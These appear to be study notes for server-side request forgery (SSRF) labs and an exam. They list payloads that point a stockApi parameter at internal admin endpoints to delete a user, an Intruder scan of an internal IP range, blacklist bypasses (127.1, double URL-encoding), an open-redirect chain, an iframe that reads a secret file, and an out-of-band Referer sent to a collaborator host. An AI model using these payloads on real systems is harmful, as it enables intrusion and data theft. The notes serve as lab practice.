- Direct SSRF:
```
stockApi=http://localhost/admin/delete?username=carlos
```
- Find Endpoint in Intruder:
```html
stockApi=http://192.168.0.§1§:6566/admin
```
- Blind with referer:
```
Referer: http://2oru8j9vlpwhqk01e8156j8a81es2kq9.oastify.com
```
- Simple Bypasses:
```
- Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the request is blocked.
- Bypass the block by changing the URL to: `http://127.1/`
- Change the URL to `http://127.1/admin` and observe that the URL is blocked again.
- Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.
```
- Via Open Redirection:
```
Redirection in:
/product/nextproduct?path=http://192.168.0.12:6566/admin

stockApi=/product/nextProduct?currentProductId=4%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

You can change the URL of stockApi to make another api action, such as delete a user 
```html
stockApi=http://localhost/admin/delete?username=carlos
```

##### Basic SSRF against another back-end system
To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.
Send to Intruder:
```html
stockApi=http://192.168.0.§1§:8080/admin
```
We find out that .31 has different lenght and we can delete carlos
```html
stockApi=http://192.168.0.31:8080/admin/delete?username=carlos
```

Exam SSRF
```
{"table-html":"<div><p>Report Heading</p><iframe src='http://localhost:6566/home/carlos/secret'"}
```
##### Blind SSRF with out-of-band detection
Change referer header to your collaborator
```
...
Sec-Fetch-Dest: document
Referer: http://2oru8j9vlpwhqk01e8156j8a81es2kq9.oastify.com
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```


##### SSRF with blacklist-based input filter
```
- Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the request is blocked.
- Bypass the block by changing the URL to: `http://127.1/`
- Change the URL to `http://127.1/admin` and observe that the URL is blocked again.
- Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.
```


##### SSRF with filter bypass via open redirection vulnerability
To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.
```
Changing directly is blocked, but we can abuse an open redirection vuln in /product/nextproduct?path=http://192.168.0.12:8080/admin

Observe that the stock checker follows the redirection and shows you the admin page.

Change stockApi from before to: /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

```